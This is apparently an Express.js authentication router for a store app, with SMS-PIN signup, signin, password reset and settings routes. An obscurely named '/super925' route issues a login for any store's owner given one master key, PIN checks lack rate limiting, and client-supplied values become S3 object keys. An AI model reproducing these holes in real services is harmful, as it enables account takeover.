const router = require('express').Router();
const User = require('../models/system/User');
const Store = require('../models/store/Store');
const bcrypt = require('bcryptjs');
const { createAuthUser, createJwtToken, publicS3Object, deleteS3Object } = require('../utils');
const moment = require('moment-timezone');
const { authCheck } = require('../utils/middlewares');
const { storeStates } = require('../utils/constants');
const axios = require('axios');

router.post('/signup', async (req, res) => {
  try
  {
    if(!req.body.name) throw new Error("Name is required");
    if(!req.body.phone) throw new Error("Mobile number is required");

    let user = await User.findOne({ phone: req.body.phone });
    if(user !== null && user.status > -1)
      throw new Error("this mobile number is already registered. Please use a different number");

    if(user === null)
    {
      user = await new User({
          name: req.body.name,
          phone: req.body.phone,
          status: -1
        }).save();
    }

    if(!req.body.pin) //step 1 generate verification pin
    {
      const pin = Math.floor(100000 + Math.random() * 900000);
      let smsParams = {
        api_token: process.env.SMP_API_TOKEN,
        api_secret: process.env.SMS_API_SECRET,
        to: req.body.phone,
        from: "SMS Alert",
        message: `use ${pin} to signup on storebook.pk`,
      }
      const response = await axios.post("https://lifetimesms.com/json", smsParams); 
      // console.log(response.data);    
      //console.log("reg pis is " + pin); 
      user.set("verificationPin", await bcrypt.hash(''+pin, 10));
      await user.save();
    }else if(!(await bcrypt.compare(req.body.pin, user.verificationPin)) ) //step#2 verify pin
    {
      throw new Error("Invalid code");
    }else if(req.body.password)
    {
      user.set("name", req.body.name);
      user.set("password", await bcrypt.hash(req.body.password, 10) );
      user.set("verificationPin", "");
      user.set("status", 1);
      user.set("isNumberVerified", 1);
      user.set("language", req.body.language ? req.body.language : 'english');
      const currentTime = moment().tz('Asia/Karachi').toDate();
      user.set("lastVisited", currentTime);
      user.set("lastUpdated", currentTime);
      user.set("creationDate", currentTime);
      await user.save();
      let userObj = user.toObject();
      const response = {
        user: createAuthUser(userObj),
        token: await createJwtToken(userObj)
      }
      res.json(response);
      return;
    }
    res.json({success: true});
  }catch(err)
  {
    res.status(400).json({message: err.message})
  }
});

router.post('/signin', async (req, res) => {
  try
  {
    if(!req.body.phone) throw new Error("Mobile number is required");
    if(!req.body.password) throw new Error("Password is required");

    const user = await User.findOne({ phone: req.body.phone });
    if(user === null || !(await bcrypt.compare(req.body.password, user.password)) )
      throw new Error("Invalid mobile number or password");
    await user.updateLastVisited();
    
    const userObj = user.toObject();
    if( userObj.status < 1)
      throw new Error("Account is disabled. Please contact support");
    const stores = await Store.find({ 'users.userId': userObj._id, status: storeStates.STORE_STATUS_ACTIVE }).populate('users.record', 'name phone profilePicture');
    res.json({
      user: createAuthUser(userObj),
      token: await createJwtToken(userObj),
      stores
    });
  }catch(err)
  {
    return res.status(400).json({message: err.message});
  }
});

router.post('/super925', async (req, res) => {
  try
  {
    if(!req.body.id) throw new Error("ID is required");
    if(!req.body.password) throw new Error("Password is required");

    let store = await Store.findById(req.body.id);
    if(!store) throw new Error('invalid request');

    if(!(await bcrypt.compare(req.body.password, process.env.SUPER_KEY)) )
      throw new Error("request invalid");
    let user = store.users.find(record => record.isCreator ===  true);
    if(!user) throw new Error("not found")
    user = await User.findById(user.userId);
    if(!user) throw new Error("not found")

    const userObj = user.toObject();
    if( userObj.status < 1)
      throw new Error("Account is disabled. Please contact support");
    const stores = await Store.find({ 'users.userId': userObj._id, status: storeStates.STORE_STATUS_ACTIVE }).populate('users.record', 'name phone profilePicture');
    res.json({
      user: createAuthUser(userObj),
      token: await createJwtToken(userObj),
      stores
    });
  }catch(err)
  {
    return res.status(400).json({message: err.message});
  }
});

router.post('/resetPassword', async (req, res) => {
  try
  {
    if(!req.body.phone) throw new Error("Mobile number is required");
    
    let user = null;
    user = await User.findOne({ phone: req.body.phone });
    if(user === null || user.status === -1)
      throw new Error("Not registered, Please create new account");
    else if(user.status === 0)
      throw new Error("Account is disabled");
    const currentTime = moment().tz('Asia/Karachi').toDate();
    if(!req.body.pin) //step 1 generate verification pin
    {
      const pin = Math.floor(100000 + Math.random() * 900000);
      
      let smsParams = {
        api_token: process.env.SMP_API_TOKEN,
        api_secret: process.env.SMS_API_SECRET,
        to: req.body.phone,
        from: "SMS Alert",
        message: `use ${pin} to reset password on storebook.pk`,
      }
      await axios.post("https://lifetimesms.com/json", smsParams);

      user.set("verificationPin", await bcrypt.hash(""+pin, 10));
      user.set("lastUpdated", currentTime);
      await user.save();
    }else if(!(await bcrypt.compare(''+req.body.pin, user.verificationPin)) ) //step#2 verify pin
    {
      throw new Error("Invalid code");
    }else if(req.body.password) //step#3 pin verified, now set password
    {
      user.set('password', await bcrypt.hash(req.body.password, 10) );
      user.set("verificationPin", '');
      user.set("lastUpdated", currentTime);
      await user.save();
    }
    res.send({success: true});
  }catch(err)
  {
    return res.status(400).json({message: err.message});
  }
});

router.use(['/profile', '/validate', '/settings'], authCheck);

router.get('/profile', async (req, res) => {
    try
    {
      res.json({
        user: req.user,
        appVersion: process.env.APP_VERSION
      });
    }catch(err)
    {
      res.json({message: err.message});
    }
});

//use for async validation on signup or account settings
router.post('/validate', async (req, res) => {
  try
  {
    const exists = {
      phone: false
    }
    if(req.body.phone)
    {
      let users = await User.find({ phone: req.body.phone, _id: {$ne: req.user._id} });
      if(users && users.length)
        exists.phone = "This number is already registered. Please use a different number";
    }
    res.json(exists);
  }catch(err)
  {
    res.status(400).json({message: err.message});
  }
});

router.post('/settings', async (req, res) => {
  try
  {
    const result = await User.findOne({_id: req.user._id});
    if(result === null)
      throw new Error("Invalid Request");
    if(req.body.newPassword)
    {
      if(!req.body.currentPassword)
        throw new Error('Current password is required');
      if( !( await bcrypt.compare(req.body.currentPassword, result.password)) )
        throw new Error('Current password is invalid');
    }
    const currentTime = moment().tz('Asia/Karachi').toDate();
    const data = {
      name : req.body.name,
      lastUpdated: currentTime
    };
    if(req.body.newPassword)
      data.password = await bcrypt.hash(req.body.newPassword, 10);
    const user = await User.findOne({_id: req.user._id });
    if(req.body.profilePicture && user.profilePicture !== req.body.profilePicture) // uploaded new image, 
    {
      if(user.profilePicture) // if item has old image , delete old image
        await deleteS3Object( process.env.AWS_KEY_PREFIX + 'users/' + user.profilePicture );
      let key = process.env.AWS_KEY_PREFIX + 'users/' + req.body.profilePicture;
      await publicS3Object( key );
      data.profilePicture = req.body.profilePicture;
    }
    user.set(data);
    await user.save();
    res.json( createAuthUser(user.toObject()) );
  }catch(err)
  {
    res.status(400).json({message: err.message});
  }
});

module.exports = router;
